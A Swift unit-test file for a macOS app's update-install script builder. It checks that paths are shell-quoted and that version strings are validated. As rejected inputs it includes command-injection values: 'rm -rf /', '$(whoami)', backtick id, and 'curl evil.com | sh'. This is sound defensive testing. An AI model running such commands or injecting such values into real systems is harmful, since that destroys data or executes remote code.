import XCTest
@testable import Pastry

/// 更新安装脚本：外部版本号/路径注入防护。
final class UpdateInstallScriptBuilderTests: XCTestCase {

    // MARK: - shellQuote

    func testShellQuoteWrapsSimpleString() {
        XCTAssertEqual(UpdateInstallScriptBuilder.shellQuote("hello"), "'hello'")
    }

    func testShellQuoteEscapesEmbeddedSingleQuotes() {
        // 'foo'bar' → 'foo'\''bar'
        let quoted = UpdateInstallScriptBuilder.shellQuote("foo'bar")
        XCTAssertEqual(quoted, "'foo'\\''bar'")
    }

    func testShellQuoteEmptyString() {
        XCTAssertEqual(UpdateInstallScriptBuilder.shellQuote(""), "''")
    }

    // MARK: - isValidVersionString

    func testValidVersionStrings() {
        XCTAssertTrue(UpdateInstallScriptBuilder.isValidVersionString("1.0.0"))
        XCTAssertTrue(UpdateInstallScriptBuilder.isValidVersionString("1.8.4"))
        XCTAssertTrue(UpdateInstallScriptBuilder.isValidVersionString("10.20.30"))
    }

    func testInvalidVersionStringsRejected() {
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString(""))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0;rm -rf /"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0$(whoami)"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0`id`"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("v1.0.0"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0-beta"))
        XCTAssertFalse(UpdateInstallScriptBuilder.isValidVersionString("1.0.0\n2"))
    }

    // MARK: - script assembly

    func testScriptUsesQuotedPathsAndSanitizedVersion() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/Pastry.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.2.3"
        )
        XCTAssertTrue(script.contains("DMG='/tmp/Pastry.dmg'"))
        XCTAssertTrue(script.contains("TARGET='/Applications/Pastry.app'"))
        XCTAssertTrue(script.contains("EXPECTED_VERSION=\"1.2.3\""))
        XCTAssertTrue(script.hasPrefix("#!/bin/bash"))
    }

    func testScriptRejectsMaliciousVersionToSafeFallback() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/x.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.0.0; curl evil.com | sh"
        )
        XCTAssertTrue(
            script.contains("EXPECTED_VERSION=\"0.0.0\""),
            "非法版本号应回落 0.0.0，不得原样写入脚本"
        )
        XCTAssertFalse(script.contains("curl evil.com"))
    }

    func testScriptQuotesPathWithSingleQuote() {
        let script = UpdateInstallScriptBuilder.script(
            stableDMGPath: "/tmp/a'b.dmg",
            targetPath: "/Applications/Pastry.app",
            expectedVersion: "1.0.0"
        )
        XCTAssertTrue(script.contains("DMG='/tmp/a'\\''b.dmg'"))
    }
}
